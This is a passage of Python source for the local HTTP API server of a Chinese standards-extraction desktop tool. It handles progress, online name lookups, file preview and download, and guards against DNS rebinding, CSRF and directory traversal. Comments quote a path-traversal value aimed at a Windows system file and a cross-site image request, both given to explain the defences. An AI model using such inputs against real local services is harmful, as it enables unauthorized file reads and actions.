            # 名称未确认的行：保留候选名并标记 name_pending（供界面显示"待核"），
            # 不再剥掉名称只留标准号（P0-9：静默丢弃会让用户以为没识别出来）。
            # 用 lookup_standard_dict 兼容空白差异（PDF 折行 / 录入清洗造成的空格不同）
            from utils.helpers import lookup_standard_dict
            for r in (part_result.get("tables") or []):
                rn = r.get("name", "")
                if "《" in rn:
                    std_num = standard_no_of(rn)
                    if lookup_standard_dict(std_num) is None:
                        r["name_pending"] = True
                        r.setdefault("name_source", "原文")
            # 用队列累积部分结果，避免多文件同时完成时被覆盖
            progress_state.setdefault("pending_results", []).append({
                "file": file_name,
                # 同时给出完整路径：不同目录下的同名文件不能只看 basename，
                # 否则前端会去重掉其中一个、失败重试也会取错文件
                "file_path": file_path,
                "result": part_result,
            })
            # 已完成文件进度设为100%，保留显示不删除
            progress_state.setdefault("file_progresses", {})[file_name] = 100

        def _on_file_progress(file_name, pct):
            if not _alive():
                return
            progress_state.setdefault("file_progresses", {})[file_name] = pct

        processor = DocumentProcessor(
            on_progress=lambda p: (progress_state.update({"value": p}) if _alive() else None),
            on_status=lambda s: (progress_state.update({"status": s}) if _alive() else None),
            on_log=lambda l: (progress_state["logs"].append(l) if _alive() else None),
            cancel_check=_check_cancel,
            on_file_complete=_on_file_complete,
            on_file_progress=_on_file_progress,
        )
        result = processor.process(task)
        # 用户点了「终止处理」：处理器现在会正常返回"已完成文件的汇总结果"
        # （不再抛异常），这里标记为已取消并直接结束 —— 已完成的中间结果早已
        # 通过 pending_results 逐步推给界面，用户不会丢数据。
        if result.get("cancelled"):
            log_print(f"[已取消] 保留已完成 {len(result.get('tables', []))} 条结果", "WARN")
            _mark_cancelled()
            return
        result_tables = result.get("tables", [])
        result_stats = result.get("stats", {})
        log_print(f"[结果] processor 返回: tables={len(result_tables)}条, stats键={len(result_stats)}个")
        if result_tables:
            log_print(f"[结果] 前5条: {[r.get('name','') for r in result_tables[:5]]}")

        # 先展示初步结果（含统计信息），让前端立即显示
        _refresh_version = 0
        # 录入模式下不会触发后台联网查询（unresolved_all 永远为空），
        # 因此直接置 100；标准提取模式继续保留 99 + 后台补全的逻辑
        _initial_value = 100 if result.get("process_mode") == "import" else 99
        _initial_status = "处理完成" if result.get("process_mode") == "import" else "处理完成，正在联网补充标准名称..."
        progress_state.update({
            "value": _initial_value,
            "status": _initial_status,
            "done": True,
            "refresh_version": _refresh_version,
            "result": {
                "tables": list(result_tables),
                "text": result.get("text", ""),
                "stats": dict(result_stats),
                "logs": result.get("logs", []),
                "toc": result.get("toc", []),
                # 录入模式专用字段（向后兼容：标准提取模式下为空数组）
                "imported": list(result.get("imported", [])),
                "skipped": list(result.get("skipped", [])),
                "process_mode": result.get("process_mode", "extract"),
            }
        })

        # 收集所有未识别的标准号，立即发起后台查询（不等全部处理完）
        _async_lookup_results = {}  # {标准号: 完整名称}
        _async_lookup_lock = threading.Lock()
        _lookup_submitted = set()

        # 录入模式：名称本就来自字典，无需联网补名。
        # 若不跳过，补名触发的 refresh_version 变化会让前端静默监听用
        # "标准提取"布局重渲染结果，导致表头与数据错位。
        if task.get("process_mode") == "import":
            unresolved_all = []
        else:
            # 收集"需要补名"的标准**编号**（补名结果字典的 key 是编号）：
            #   ① 名称缺失：无《》的纯编号；
            #   ② 名称未确认：name_pending（候选名提取自原文，未与字典/联网核对）。
            # 用 standard_no_of 统一截取编号，避免带《》的候选名被当成查询词。
            unresolved_all = []
            for r in result_tables:
                nm = r.get("name", "")
                if not nm:
                    continue
                if "《" not in nm or r.get("name_pending"):
                    unresolved_all.append(standard_no_of(nm))

        def _do_background_lookup():
            """后台批量查询，处理期间持续更新结果"""
            nonlocal result_tables, result_stats, _refresh_version
            if not task.get("auto_lookup", True) or cancel_flag or not unresolved_all:
                return
            # 本线程会活过 _process_lock 的释放（联网查询很慢），若期间用户开始了
            # 新任务，就不能再把结果写进 progress_state —— 否则新任务会突然"完成"
            # 并显示上一个文件的结果
            if not _alive():
                return
            # 分批查询：先查第一批，后续补全
            batch_size = min(10, len(unresolved_all))
            first_batch = unresolved_all[:batch_size]
            with _async_lookup_lock:
                for s in first_batch:
                    _lookup_submitted.add(s)
            log_print(f"[自动查询] 立即启动第1批 {len(first_batch)} 个查询...")
            try:
                res = batch_online_lookup(first_batch, strip_year=task.get("strip_year", False))
                with _async_lookup_lock:
                    for k, v in res.items():
                        if v:
                            _async_lookup_results[k] = v
                            # 自动补名一律写「待审核」，不直接进主字典：
                            # 本地字典是所有批次共用的权威数据，一次错误的联网匹配
                            # 若被静默固化进去，之后每一批输出都会跟着错、且无法追溯。
                            # 手动查询走的也是 add_standard_to_review，自动补名没理由更可信。
                            add_standard_to_review(v)
                log_print(f"[自动查询] 第1批查到 {sum(1 for v in res.values() if v)} 个")
            except Exception as e:
                log_print(f"[自动查询] 第1批异常: {e}", "WARN")

            # 查剩余部分
            import time as _t
            _t.sleep(0.5)
            with _async_lookup_lock:
                remaining = [s for s in unresolved_all if s not in _lookup_submitted]
                for s in remaining:
                    _lookup_submitted.add(s)
                # 先应用已有结果到 result_tables。
                # 按编号匹配：待核行的 name 是"编号《原文候选》"，
                # 完整显示名不能直接当查询键用。
                if _async_lookup_results:
                    for r in result_tables:
                        std_no = standard_no_of(r.get("name", ""))
                        if std_no in _async_lookup_results:
                            r["name"] = _async_lookup_results[std_no]
                            r["source"] = "联网"
                            r.pop("name_pending", None)
            if remaining:
                log_print(f"[自动查询] 继续查询剩余 {len(remaining)} 个...")
                try:
                    res2 = batch_online_lookup(remaining, strip_year=task.get("strip_year", False))
                    with _async_lookup_lock:
                        for k, v in res2.items():
                            if v:
                                _async_lookup_results[k] = v
                                # 同上：自动补名只进「待审核」，绝不直接固化进主字典
                                add_standard_to_review(v)
                except Exception as e:
                    log_print(f"[自动查询] 剩余查询异常: {e}", "WARN")
            # 最终应用所有结果，并且**无论查到几条都必须收尾**。
            # 原实现把收尾整块放在 `if _async_lookup_results:` 里 —— 一条都没查到时
            # （断网 / 内网封锁 / 平台未收录）就没人把进度推到 100%，
            # 界面永久停在 99%「正在联网补充标准名称…」，用户一直等一个不会来的结果。
            with _async_lookup_lock:
                _applied = dict(_async_lookup_results)
            if _applied:
                for r in result_tables:
                    std_no = standard_no_of(r.get("name", ""))
                    if std_no in _applied:
                        r["name"] = _applied[std_no]
                        r["source"] = "联网"
                        r.pop("name_pending", None)   # 补全成功，不再是"待核"
                # 统计键同步改名：键可能是纯编号（名称缺失行）或
                # "编号《原文候选》"（待核行），统一按**编号**查找新名称，
                # 否则待核行的统计键会更新不到，统计表与结果表对不上。
                updated = {}
                for old_key, info in result_stats.items():
                    new_key = _applied.get(standard_no_of(old_key), old_key)
                    updated[new_key] = info
                result_stats.clear()
                result_stats.update(updated)
                _refresh_version += 1
                log_print(f"[自动查询] [OK] 共识别 {len(_applied)} 个标准名称")

            # 没查到的也要如实告诉用户（这些条目已保留标准编号，不是失败）
            _missed = [s for s in unresolved_all if s not in _applied]
            if _missed:
                log_print(f"[自动查询] [注意] {len(_missed)} 条未查到名称（已保留标准编号）: "
                          f"{_missed[:5]}", "WARN")

            if not _alive():
                log_print("[自动查询] 任务已被新任务取代，丢弃本次补名结果", "WARN")
                return
            _final_status = "处理完成"
            if _missed:
                _final_status = f"处理完成（{len(_missed)} 条未查到标准名称，已保留编号）"
            progress_state.update({
                "value": 100,
                "status": _final_status,
                "missed_names": len(_missed),
                "refresh_version": _refresh_version,
                "result": {
                    "tables": result_tables,
                    "text": result.get("text", ""),
                    "stats": result_stats,
                    "logs": result.get("logs", []),
                    "toc": result.get("toc", []),
                    "imported": list(result.get("imported", [])),
                    "skipped": list(result.get("skipped", [])),
                    "missed_names": len(_missed),
                    "process_mode": result.get("process_mode", "extract"),
                }
            })

        def _lookup_guard():
            """兜底包装：后台补名线程无论怎么退出，都不能让界面停在 99%"""
            try:
                _do_background_lookup()
            except Exception as _e:
                log_print(f"[自动查询] 后台补名异常终止: {_e}", "WARN")
                if _alive():
                    progress_state.update({"value": 100,
                                           "status": "处理完成（联网补充中断）"})

        if not cancel_flag and task.get("auto_lookup", True) and allow_network_lookup() and unresolved_all:
            threading.Thread(target=_lookup_guard, daemon=True).start()
        else:
            # 没有需要补全的标准（或用户关了自动查询、涉密模式禁用联网）时，
            # 必须把上一步设的 99% 收尾成 100%。
            # 否则界面会永远停在"处理完成，正在联网补充标准名称…"+ 99%，
            # 用户以为程序还在跑，还会一直等一个永远不会来的结果。
            if unresolved_all and not allow_network_lookup():
                log_print("[涉密模式] 已自动禁用联网查标准功能", "INFO")
            if _alive():
                progress_state.update({"value": 100, "status": "处理完成"})
    except RuntimeError as e:
        # 只有用户真的点了"终止"才算取消；PyMuPDF / COM / openpyxl 等也会抛
        # RuntimeError，一律当成"已取消"会把真实错误藏掉，用户看不到原因
        if cancel_flag:
            _mark_cancelled()
        else:
            _mark_failed(e)
    except Exception as e:
        if cancel_flag:
            _mark_cancelled()
            return
        _mark_failed(e)


def _run_process_wrapper(task):
    """包装 run_process，确保处理锁正确释放"""
    try:
        run_process(task)
    finally:
        try:
            _process_lock.release()
        except RuntimeError:
            pass  # 锁已被释放或未被持有


class APIHandler(BaseHTTPRequestHandler):
    def log_message(self, format, *args):
        msg = format % args
        # 刷屏的轮询请求不打印
        if "GET /api/progress" in msg or "POST /api/process" in msg:
            return
        log_print(f"{self.address_string()} - {msg}", "HTTP")

    def _send_json(self, data, status=200):
        # 凡是返回给界面文件列表的接口，都顺手把这些路径登记为"可预览"，
        # 这样 /api/file 只需放行白名单内的文件即可（各接口无需逐一改动）
        try:
            if isinstance(data, dict):
                allow_preview([f.get("path") for f in (data.get("files") or [])
                               if isinstance(f, dict)])
        except Exception:
            pass
        self.send_response(status)
        self.send_header("Content-Type", "application/json; charset=utf-8")
        self.send_header("Access-Control-Allow-Origin", "http://127.0.0.1:8765")
        self.end_headers()
        self.wfile.write(json.dumps(data, ensure_ascii=False).encode("utf-8"))

    # 供耗时操作上报进度 / 检查取消。同步请求下是空操作；
    # 异步任务里由 _JobContext 覆盖成真实实现（见文件末尾）。
    def _progress(self, value=None, status=None):
        pass

    def _cancelled(self):
        return False

    def _send_file(self, file_path, content_type):
        try:
            with open(file_path, "rb") as f:
                content = f.read()
            self.send_response(200)
            self.send_header("Content-Type", content_type)
            # 界面文件与静态资源一律不缓存：
            # QtWebEngine 会把 index.html/*.js 缓存到 .webdata，升级（重装/覆盖安装）后
            # 仍然加载旧界面 —— 表现为"改了的地方没生效""界面还是老样子"，
            # 用户和开发者都极难定位。本地程序没有带宽顾虑，直接禁用缓存。
            self.send_header("Cache-Control", "no-store, no-cache, must-revalidate")
            self.send_header("Pragma", "no-cache")
            self.send_header("Expires", "0")
            self.send_header("Content-Length", str(len(content)))
            self.send_header("Access-Control-Allow-Origin", "http://127.0.0.1:8765")
            self.end_headers()
            self.wfile.write(content)
        except FileNotFoundError:
            self.send_response(404)
            self.end_headers()
            self.wfile.write(b"Not found")

    def _send_binary(self, content, content_type, filename):
        self.send_response(200)
        self.send_header("Content-Type", content_type)
        self.send_header("Content-Disposition", f'attachment; filename="{filename}"')
        self.send_header("Content-Length", str(len(content)))
        self.send_header("Access-Control-Allow-Origin", "http://127.0.0.1:8765")
        self.end_headers()
        self.wfile.write(content)

    def _host_allowed(self) -> bool:
        """校验 Host 头，阻断 DNS 重绑定攻击。

        若用户在浏览器里访问 http://攻击域名:8765（该域名被解析到 127.0.0.1），
        请求就会打到本服务，而浏览器认为它与页面"同源" —— 攻击页面便能调用
        我们的所有接口（/api/file 读文件、/api/process 启动任务、/api/reset 清数据）。
        Windows 防火墙挡不住这类请求（它就是本机回环流量）。
        这里只接受本机主机名即可阻断。
        """
        host = (self.headers.get("Host") or "").strip().lower()
        if not host:
            return True     # HTTP/1.0 等不带 Host 的请求（如本程序内部探活）
        name = host.rsplit(":", 1)[0] if not host.startswith("[") else host.split("]")[0] + "]"
        return name in ("127.0.0.1", "localhost", "[::1]", "::1")

    def _reject_bad_host(self) -> bool:
        """Host 头非法时回 403 并返回 True（调用方直接 return）"""
        if self._host_allowed():
            return False
        log_print(f"[安全] 拒绝非法 Host 的请求: {self.headers.get('Host')!r}", "WARN")
        self.send_response(403)
        self.send_header("Content-Type", "text/plain; charset=utf-8")
        self.end_headers()
        self.wfile.write("Forbidden: invalid Host header".encode("utf-8"))
        return True

    def do_OPTIONS(self):
        self.send_response(200)
        self.send_header("Access-Control-Allow-Origin", "http://127.0.0.1:8765")
        self.send_header("Access-Control-Allow-Methods", "GET, POST, OPTIONS")
        self.send_header("Access-Control-Allow-Headers", "Content-Type")
        self.end_headers()

    def do_GET(self):
        from urllib.parse import unquote
        if self._reject_bad_host():
            return
        # GET 原先完全没有跨站校验，而 GET 里也有会改状态的接口
        # （如清空日志）→ 任意网页一句 <img src="http://127.0.0.1:8765/api/...">
        # 就能生效。同源请求与本地客户端不带 Origin，不受影响。
        if self._reject_cross_site():
            return
        parsed = urlparse(self.path)
        path = unquote(parsed.path)

        if path == "/" or path == "/index.html":
            web_dir = _script_dir()
            self._send_file(os.path.join(web_dir, "index.html"), "text/html; charset=utf-8")
        elif path.startswith("/static/") or any(
                path.endswith(ext) for ext in (
                    ".js", ".css", ".png", ".ico",
                    # pdf.js 4.x 的资源类型：ESM 模块、cmaps（中文 PDF 预览）、内置字体
                    ".mjs", ".bcmap", ".pfb")):
            # 处理 web 目录下的静态资源
            web_dir = _script_dir()
            rel = path.lstrip("/")
            if path == "/favicon.ico":
                self.send_response(404)
                self.end_headers()
                return
            file_path = os.path.join(web_dir, rel)
            # 防目录穿越：解析后的真实路径必须仍在 web 目录内（如 /static/../../x.js）
            if not os.path.realpath(file_path).startswith(os.path.realpath(web_dir) + os.sep):
                self.send_response(404)
                self.end_headers()
                self.wfile.write(b"Not found")
                return
            import mimetypes as _mt
            mime, _ = _mt.guess_type(file_path)
            mime = mime or "application/octet-stream"
            # pdf.js 的资源必须显式给对类型：
            #   .mjs —— 浏览器**只接受 JS MIME 才肯加载 ES 模块**，否则直接拒绝执行
            #            （pdf.min.mjs 是整个预览的入口，类型错了预览全废）
            #   .bcmap / .pfb —— python 的 mimetypes 不认识，按字节流返回即可
            _ext2 = os.path.splitext(file_path)[1].lower()
            if _ext2 == ".mjs":
                mime = "text/javascript; charset=utf-8"
            elif _ext2 in (".bcmap", ".pfb"):
                mime = "application/octet-stream"
            self._send_file(file_path, mime)
        elif path == "/api/status":
            self._send_json({"status": "ok", "timestamp": time.time(), "classified": is_classified()})
        elif path == "/api/security_status":
            self._send_json({
                "classified": is_classified(),
                "allow_network_lookup": allow_network_lookup(),
                "allow_feedback": allow_feedback_webhook(),
                # 反馈通道是否已配置凭据（环境变量或构建期注入的私有模块）。
                # 从公开源码构建的副本此处为 False，前端据此提示改用邮箱。
                "feedback_configured": has_feedback_config(),
                "fallback_email": FEEDBACK_FALLBACK_EMAIL,
                "allow_ai": allow_ai_enhance(),
                "firewall": _firewall_info(),
            })
        elif path == "/api/firewall_status":
            self._send_json(_firewall_info())
        elif path == "/api/firewall_log":
            query = parse_qs(parsed.query)
            clear = query.get("clear", [""])[0].lower() in ("1", "true", "yes")
            self._send_json({"logs": query_firewall_log(clear=clear)})
        elif path == "/api/firewall/manage":
            self.handle_firewall_manage()
            return
        elif path == "/api/progress":
            # 增量返回：前端每 500ms 轮询一次，若每次都把全部日志与中间结果发回去，
            # 长任务下响应体会随文件数线性膨胀。带 log_from / pending_from 参数时
            # 只返回这两项的新增部分（并给出总数作为下次的游标）；
            # 不带参数时保持原有整包返回，向后兼容。
            st = dict(progress_state)  # 浅拷贝，避免处理线程写入时读到半更新状态
            _logs = st.get("logs") or []
            _pending = st.get("pending_results") or []
            st["logs_total"] = len(_logs)
            st["pending_total"] = len(_pending)
            _q = parse_qs(parsed.query)
            if "log_from" in _q or "pending_from" in _q:
                def _cursor(key):
                    try:
                        return max(0, int(_q.get(key, ["0"])[0]))
                    except Exception:
                        return 0
                st["logs"] = _logs[_cursor("log_from"):]
                st["pending_results"] = _pending[_cursor("pending_from"):]
            # result 可能很大（5000 行时实测 525KB），而"后台联网补名"期间前端会
            # 持续轮询最多 3 分钟 —— 每 500ms 重发一遍就是每秒约 1MB 的
            # 序列化 + 传输 + 前端 JSON.parse，界面会明显发涩。
            # 客户端用 result_ver 表示"已消费到哪个 refresh_version"：
            # 版本相同就不回传 result；首次请求（缺省）或补名更新过结果时
            # 版本会变化，照常回传。主轮询用 include_result=1 显式索要。
            if "include_result" not in _q and "result_ver" in _q:
                try:
                    _client_ver = int(_q.get("result_ver", ["-1"])[0])
                except Exception:
                    _client_ver = -1
                if _client_ver == st.get("refresh_version", 0):
                    st["result"] = None
                    st["result_omitted"] = True
            self._send_json(st)
        elif path == "/api/job":
            # 查询后台任务进度（异步导出等）
            job_id = (parse_qs(parsed.query).get("id", [""])[0] or "").strip()
            with _jobs_lock:
                job = _jobs.get(job_id)
                snap = dict(job) if job else None
            if snap is None:
                self._send_json({"error": "任务不存在或已过期"}, 404)
            else:
                snap.pop("cancel", None)   # 内部字段不下发
                self._send_json(snap)
        elif path == "/api/tutorial_check":
            self.handle_tutorial_check()
        elif path == "/api/result":
            self._send_json(progress_state.get("result") or {})
        elif path == "/api/load_settings":
            self.handle_load_settings()
            return
        elif path == "/api/ai_status":
            self.handle_ai_status()
            return
        elif path == "/api/agreement.pdf":
            import mimetypes
            # 法务：文档名称统一为"说明"（不再叫"用户协议"，避免被理解为需同意的合同）。
            # 优先新文档；旧文件名只作回退，且会记一条告警，便于发现"还在分发旧协议"。
            agreement_path = None
            # ⚠ 必须用 _data_path()：它会同时查「exe 目录」与「_internal（sys._MEIPASS）」。
            # 这里原先只查 exe 目录，而 PyInstaller 6 的 onedir 把 datas 放进 _internal →
            # 发布版直接 404，用户看到的就是"用户说明打不开"。
            for _name in ("标准处理系统 许可、隐私与免责说明.pdf",
                          "标准处理系统 用户说明.pdf",
                          "标准处理系统 用户协议.pdf",
                          # 兜底：若某次只随包发了图片版，也能照常打开
                          "标准处理系统 许可、隐私与免责说明.jpg",
                          "标准处理系统 许可、隐私与免责说明.png"):
                _p = _data_path(_name)
                if os.path.exists(_p):
                    agreement_path = _p
                    if "用户协议" in _name:
                        log_print("[说明] 当前打开的是旧版《用户协议》文件，建议替换为"
                                  "《标准处理系统 许可、隐私与免责说明.pdf》", "WARN")
                    break
            if agreement_path and os.path.exists(agreement_path):
                with open(agreement_path, "rb") as f:
                    content = f.read()
                import mimetypes
                self.send_response(200)
                # 按实际文件类型回传：PDF 走 pdf.js，图片走 <img>（前端按 Content-Type 分流）
                self.send_header("Content-Type",
                                 mimetypes.guess_type(agreement_path)[0]
                                 or "application/octet-stream")
                self.send_header("Content-Disposition", "inline")
                self.send_header("Cache-Control", "no-store")
                self.end_headers()
                self.wfile.write(content)
            else:
                self.send_response(404)
                self.end_headers()
                self.wfile.write(b"Not found")
            return
        elif path == "/api/license.txt":
            # 开源许可**原文**：直接读随程序的 LICENSE 文件。
            # 法务要求界面展示全文（而不是自己写的摘要）——摘要容易与原文出现偏差，
            # 而 AGPL 的条款解释权不在我们这边。
            # 安全：只读固定的两个候选文件名，不接受任何路径参数 → 没有任意文件读取面。
            license_path = None
            # 打包后 _root_dir() 是 **exe 目录**，而 PyInstaller 6 会把 datas 放进
            # _internal/（= sys._MEIPASS）→ 只查一处就会出现"发布版读不到 LICENSE"。
            # 这里把两处都查；再兜底到 licenses\ 里的 AGPL 原文。
            _cands = []
            for _base in (_root_dir(), getattr(sys, "_MEIPASS", "") or ""):
                if not _base:
                    continue
                for _name in ("LICENSE", "LICENSE.txt"):
                    _cands.append(os.path.join(_base, _name))
            _cands.append(os.path.join(_root_dir(), "licenses", "AGPL-3.0.txt"))
            for _p in _cands:
                if os.path.exists(_p):
                    license_path = _p
                    break
            if license_path:
                try:
                    with open(license_path, "r", encoding="utf-8", errors="replace") as f:
                        text = f.read()
                    body = text.encode("utf-8")
                    self.send_response(200)
                    self.send_header("Content-Type", "text/plain; charset=utf-8")
                    self.send_header("Content-Length", str(len(body)))
                    self.send_header("Cache-Control", "no-store")
                    self.end_headers()
                    self.wfile.write(body)
                except Exception as e:
                    log_print(f"读取 LICENSE 失败: {e}", "WARN")
                    self.send_response(500)
                    self.end_headers()
            else:
                self.send_response(404)
                self.end_headers()
                self.wfile.write(b"LICENSE not found")
            return
        elif path == "/api/third_party_notices.txt":
            # 第三方组件与许可声明：与 LICENSE 一样属于"必须可读"的合规文本，
            # 界面的「第三方组件许可」菜单直接展示它，用户不必去安装目录翻文件。
            # 安全：只读固定文件名，不接受路径参数。
            notices_path = None
            for _base in (_root_dir(), getattr(sys, "_MEIPASS", "") or "",
                          os.path.join(_root_dir(), "安装程序")):
                if not _base:
                    continue
                _p = os.path.join(_base, "THIRD-PARTY-NOTICES.txt")
                if os.path.exists(_p):
                    notices_path = _p
                    break
            if notices_path:
                try:
                    with open(notices_path, "r", encoding="utf-8", errors="replace") as f:
                        body = f.read().encode("utf-8")
                    self.send_response(200)
                    self.send_header("Content-Type", "text/plain; charset=utf-8")
                    self.send_header("Content-Length", str(len(body)))
                    self.send_header("Cache-Control", "no-store")
                    self.end_headers()
                    self.wfile.write(body)
                except Exception as e:
                    log_print(f"读取第三方许可声明失败: {e}", "WARN")
                    self.send_response(500)
                    self.end_headers()
            else:
                self.send_response(404)
                self.end_headers()
                self.wfile.write(b"THIRD-PARTY-NOTICES not found")
            return
        elif path == "/api/file":
            query = parse_qs(parsed.query)
            file_path = query.get("path", [""])[0]
            # 安全：只放行"服务器确实交给过界面的文件"（PDF.js 预览用）。
            # 原先只拦 ".."，本机任意文件都能被读走；响应还带
            # Access-Control-Allow-Origin: *，任意网页可跨域读取内容。
            ext = os.path.splitext(file_path)[1].lower()
            if (not file_path or ".." in file_path
                    or ext not in _PREVIEW_DOC_EXTS
                    or not os.path.isfile(file_path)
                    or not is_preview_allowed(file_path)):
                log_print(f"[预览] 拒绝读取未授权路径: {sanitize_log(file_path)}", "WARN")
                self.send_response(403)
                self.send_header("Content-Type", "text/plain; charset=utf-8")
                self.end_headers()
                self.wfile.write("Forbidden".encode("utf-8"))
                return
            import mimetypes
            mime, _ = mimetypes.guess_type(file_path)
            mime = mime or "application/octet-stream"
            try:
                with open(file_path, "rb") as f:
                    content = f.read()
                self.send_response(200)
                self.send_header("Content-Type", mime)
                self.send_header("Content-Disposition", "inline")
                self.end_headers()
                self.wfile.write(content)
            except OSError as e:
                self.send_response(404 if isinstance(e, FileNotFoundError) else 500)
                self.end_headers()
                self.wfile.write(str(e).encode("utf-8", "ignore"))
        elif path == "/api/download":
            query = parse_qs(parsed.query)
            file_id = query.get("id", [""])[0]
            # 导出文件名一律由 uuid 生成，这里只接受纯文件名，
            # 避免 /api/download?id=..%2F..%2FWindows%2Fwin.ini 读到任意本地文件
            if (not file_id or "/" in file_id or "\\" in file_id
                    or ".." in file_id or ":" in file_id):
                self.send_response(400)
                self.end_headers()
                self.wfile.write(b"Invalid file id")
                return
            file_path = os.path.join(EXPORT_DIR, file_id)
            if (not os.path.realpath(file_path).startswith(os.path.realpath(EXPORT_DIR) + os.sep)
                    or not os.path.exists(file_path)):
                self.send_response(404)
                self.end_headers()
                self.wfile.write(b"File not found")
                return
            # Determine content type
            ext = os.path.splitext(file_path)[1].lower()
            mime_map = {
                '.xlsx': 'application/vnd.openxmlformats-officedocument.spreadsheetml.sheet',
                '.xls': 'application/vnd.ms-excel',
                '.pptx': 'application/vnd.openxmlformats-officedocument.presentationml.presentation',
                '.docx': 'application/vnd.openxmlformats-officedocument.wordprocessingml.document',
                '.json': 'application/json',
                '.csv': 'text/csv',
                '.txt': 'text/plain',
                '.md': 'text/markdown',
                '.rtf': 'application/rtf',
            }
            mime = mime_map.get(ext, 'application/octet-stream')
            try:
                with open(file_path, "rb") as f:
                    content = f.read()
                self.send_response(200)
                self.send_header("Content-Type", mime)
                filename = os.path.basename(file_path)
                self.send_header("Content-Disposition", f'attachment; filename="{filename}"')
                self.send_header("Content-Length", str(len(content)))
                # 不带 Access-Control-Allow-Origin: * —— 导出文件是本机数据，
                # 通配的 CORS 会让任意网页都能把它读走（同源下载并不需要这个头）
                self.end_headers()
                self.wfile.write(content)
            except Exception as e:
                self.send_response(500)
                self.end_headers()
                self.wfile.write(str(e).encode())
        elif path == "/api/builtin_prefixes":
            self.handle_builtin_prefixes()
            return
        elif path == "/api/check_pending_import":
            self.handle_check_pending_import()
            return
        elif path == "/api/dict/review":
            # 字典待审核列表（只读，GET）
            self.handle_dict_review()
            return
        elif path == "/api/dict/main":
            # 主字典列表（只读，GET）
            self.handle_dict_main()
            return
        else:
            self.send_response(404)
            self.end_headers()
            self.wfile.write(b"Not found")

    def _origin_allowed(self) -> bool:
        """校验 Origin/Referer，阻断跨站请求伪造（CSRF）。

        Host 校验只挡 DNS 重绑定，挡不住"恶意网页直接 fetch 127.0.0.1:8765"：
        这类请求是"简单请求"（text/plain + JSON 体），**不会触发预检**，
        于是网页可以悄悄调用我们的写接口 —— 删字典、改设置、装右键菜单，
        甚至配合 /api/export 往本机写文件。浏览器必定会带 Origin，
        所以只放行"自己人"（本机页面 / 无 Origin 的本地客户端）。
        """
        # 本服务自己的端口：取本次请求的 Host 头（自洽，无需全局端口变量）。
        # 端口必须比对，否则只校验主机名等于放行"本机任意端口的网页" ——
        # 用户在 127.0.0.1:3000 上跑的任何服务（另一个工具、开发服务器、
        # 甚至是别的东西起的本地站点）都能调用本程序接口。
        host_hdr = (self.headers.get("Host") or "").strip().lower()
        my_port = ""
        if host_hdr.startswith("["):
            my_port = host_hdr.split("]")[-1].lstrip(":")
        elif ":" in host_hdr:
            my_port = host_hdr.rsplit(":", 1)[1]
        for header in ("Origin", "Referer"):
            val = (self.headers.get(header) or "").strip()
            if not val:
                continue
            try:
                p = urlparse(val)
                host = (p.hostname or "").lower()
                port = str(p.port or (443 if p.scheme == "https" else 80))
            except Exception:
                return False        # 解析不了（含 Origin: null）→ 一律拒绝
            if host not in ("127.0.0.1", "localhost", "::1"):
                return False
            if my_port:
                if port != my_port:
                    return False
            elif port not in ("80", "443"):
                return False
        return True

    def _reject_cross_site(self) -> bool:
        """跨站请求时回 403 并返回 True（调用方直接 return）"""
        if self._origin_allowed():
            return False
        log_print(f"[安全] 拒绝跨站请求: Origin={self.headers.get('Origin')!r} "
                  f"Referer={self.headers.get('Referer')!r}", "WARN")
        self.send_response(403)
        self.send_header("Content-Type", "text/plain; charset=utf-8")
        self.end_headers()
        self.wfile.write("Forbidden: cross-site request".encode("utf-8"))
        return True

    def do_POST(self):
        if self._reject_bad_host():
            return
        if self._reject_cross_site():
            return
        parsed = urlparse(self.path)
        path = parsed.path

        if path == "/api/upload":
            self.handle_upload()
            return

        if path == "/api/cancel":
            self.handle_cancel({})
            return

        if path == "/api/install_ocr":
            self.handle_install_ocr()
            return

        # JSON-only endpoints
        # Content-Length 是客户端可控的，畸形值会让 int() 抛错、连接被直接掐断
        # （前端只看到 fetch failed）；超大值则可能把内存吃满。
        try:
            content_length = int(self.headers.get("Content-Length", 0) or 0)
        except (TypeError, ValueError):
            self._send_json({"error": "Content-Length 不合法"}, 400)
            return
        if content_length < 0 or content_length > _MAX_JSON_BODY:
            self._send_json({"error": "请求体过大"}, 413)
            return
        body = self.rfile.read(content_length).decode("utf-8", "ignore")

        try:
            data = json.loads(body)
        except json.JSONDecodeError:
            self._send_json({"error": "Invalid JSON"}, 400)
            return

        if path == "/api/tutorial_done":
            self.handle_tutorial_done()
            return

        if path == "/api/preview_process":
            self.handle_preview_process(data)
            return

        if path == "/api/job_cancel":
            # 取消后台任务（如导出）：只置标志，工作线程在检查点自行退出
            job_id = (data.get("job_id") or "").strip()
            job = None
            with _jobs_lock:
                job = _jobs.get(job_id)
                if job:
                    job["cancel"] = True
            self._send_json({"ok": job is not None})
            return

        if path == "/api/export":
            # 默认异步：立即返回 job_id，前端轮询 /api/job 获取进度并可取消。
            # 传 {"sync": true} 时保持旧的同步行为（向后兼容）。
            if data.get("sync"):
                self.handle_export(data)
            else:
                job = create_job("export")
                threading.Thread(target=_run_export_job, args=(job, data), daemon=True).start()
                self._send_json({"job_id": job["id"]})
        elif path == "/api/save_dialog":
            self.handle_save_dialog(data)
        elif path == "/api/save_settings":
            self.handle_save_settings(data)
        elif path == "/api/load_settings":
            self.handle_load_settings()
        elif path == "/api/ai_test":
            self.handle_ai_test(data)
        elif path == "/api/page_counts":
            self.handle_page_counts(data)
        elif path == "/api/reset":
            self.handle_reset(data)
        elif path == "/api/dict/batch_review":
            self.handle_dict_batch_review(data)
        elif path == "/api/dict/approve":
            self.handle_dict_approve(data)
        elif path == "/api/dict/reject":
            self.handle_dict_reject(data)
        elif path == "/api/dict/add":
            self.handle_dict_add(data)
        elif path == "/api/dict/delete":
            self.handle_dict_delete(data)
        elif path == "/api/set_classified_mode":
            self.handle_set_classified_mode(data)
        elif path == "/api/firewall/block":
            self.handle_firewall_block(data)
            return
        elif path == "/api/firewall/allow":
            self.handle_firewall_allow(data)
            return
        elif path == "/api/restart_as_admin":
            self.handle_restart_as_admin(data)
        elif path == "/api/notify":
            self.handle_notify(data)
        elif path == "/api/feedback":
            self.handle_feedback(data)
        elif path == "/api/install_ocr":
            self.handle_install_ocr()
        elif path == "/api/process":
            self.handle_process(data)
        elif path == "/api/select_files":
            self.handle_select_files(data)
        elif path == "/api/select_folder":
            self.handle_select_folder(data)
        elif path == "/api/preview":
            self.handle_preview(data)
        elif path == "/api/lookup_standard":
            self.handle_lookup_standard(data)
        elif path == "/api/add_to_dict":
            self.handle_add_to_dict(data)
        elif path == "/api/import_files":
            self.handle_import_files(data)
            return
        elif path == "/api/import_folder":
